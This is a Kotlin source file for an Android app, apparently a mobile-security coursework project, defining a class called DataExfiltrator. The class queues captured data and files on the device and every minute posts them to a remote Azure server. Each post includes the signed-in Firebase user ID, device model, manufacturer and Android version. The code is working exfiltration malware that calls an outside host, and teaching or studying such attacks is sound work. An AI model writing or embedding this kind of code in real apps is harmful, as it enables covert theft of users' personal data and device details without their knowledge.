package com.example.inf2215

import android.content.Context
import android.os.Build
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class DataExfiltrator(private val context: Context) {

    // Use the same server endpoint as MainActivity
    private val serverUrl = "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"

    private val pendingDataFile = File(context.filesDir, "pending_data.txt")
    private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = true

    init {
        restorePendingData()
        restorePendingFiles()
        startExfilLoop()
    }

    // ------------------ Public API ------------------
    fun queueData(data: String) {
        synchronized(this) {
            pendingDataFile.appendText("$data\n")
        }
    }

    fun queueFile(file: File) {
        val dest = File(pendingFilesDir, file.name)
        if (file.renameTo(dest)) {
            // success
        } else {
            Log.e("DataExfiltrator", "Failed to move file to pending: ${file.name}")
        }
    }

    // ------------------ Restoration ------------------
    private fun restorePendingData() {
        // nothing to do, file already exists
    }

    private fun restorePendingFiles() {
        // files already in pendingFilesDir
    }

    // ------------------ Exfiltration Loop ------------------
    private fun startExfilLoop() {
        scope.launch {
            while (isRunning) {
                sendPendingData()
                sendPendingFiles()
                delay(60000) // 60 seconds
            }
        }
    }

    private fun sendPendingData() {
        if (!pendingDataFile.exists()) return
        val lines = mutableListOf<String>()
        val unsentLines = mutableListOf<String>()

        synchronized(this) {
            try {
                lines.addAll(pendingDataFile.readLines())
                pendingDataFile.writeText("") // clear file temporarily
            } catch (e: Exception) {
                Log.e("DataExfiltrator", "Error reading pending data", e)
                return
            }
        }

        lines.forEach { line ->
            if (line.isNotBlank()) {
                if (sendDataToServer("exfil_data", line)) {
                    // success, do not add back
                } else {
                    unsentLines.add(line)
                }
            }
        }

        // Rewrite unsent lines back to file
        if (unsentLines.isNotEmpty()) {
            synchronized(this) {
                pendingDataFile.appendText(unsentLines.joinToString("\n") + "\n")
            }
        }
    }

    private fun sendPendingFiles() {
        val files = pendingFilesDir.listFiles() ?: return
        files.forEach { file ->
            if (sendFileToServer(file)) {
                file.delete()
            }
        }
    }

    // ------------------ Server Communication ------------------
    private fun sendDataToServer(action: String, data: String): Boolean {
        return try {
            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
            val deviceModel = Build.MODEL
            val manufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE

            val json = """
            {
                "device_model": "$deviceModel",
                "manufacturer": "$manufacturer",
                "android_version": "$androidVersion",
                "type": "user_action",
                "uid": "$uid",
                "action": "$action",
                "timestamp": ${System.currentTimeMillis()},
                "data": "${escapeJson(data)}"
            }
            """.trimIndent()

            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            connection.outputStream.use { it.write(json.toByteArray()) }

            val success = connection.responseCode == HttpURLConnection.HTTP_OK
            connection.disconnect()
            success
        } catch (e: Exception) {
            Log.e("DataExfiltrator", "sendDataToServer failed: ${e.message}")
            false
        }
    }

    private fun sendFileToServer(file: File): Boolean {
        return try {
            // Read file content as base64 (optional) – here we send metadata only
            // But we could also send the file content if needed.
            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
            val deviceModel = Build.MODEL
            val manufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE

            val json = """
            {
                "device_model": "$deviceModel",
                "manufacturer": "$manufacturer",
                "android_version": "$androidVersion",
                "type": "file_upload",
                "uid": "$uid",
                "action": "file_upload",
                "timestamp": ${System.currentTimeMillis()},
                "filename": "${escapeJson(file.name)}",
                "size": ${file.length()}
            }
            """.trimIndent()

            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            connection.outputStream.use { it.write(json.toByteArray()) }

            val success = connection.responseCode == HttpURLConnection.HTTP_OK
            connection.disconnect()
            success
        } catch (e: Exception) {
            Log.e("DataExfiltrator", "sendFileToServer failed: ${e.message}")
            false
        }
    }

    private fun escapeJson(str: String): String {
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    fun shutdown() {
        isRunning = false
        scope.cancel()
    }
}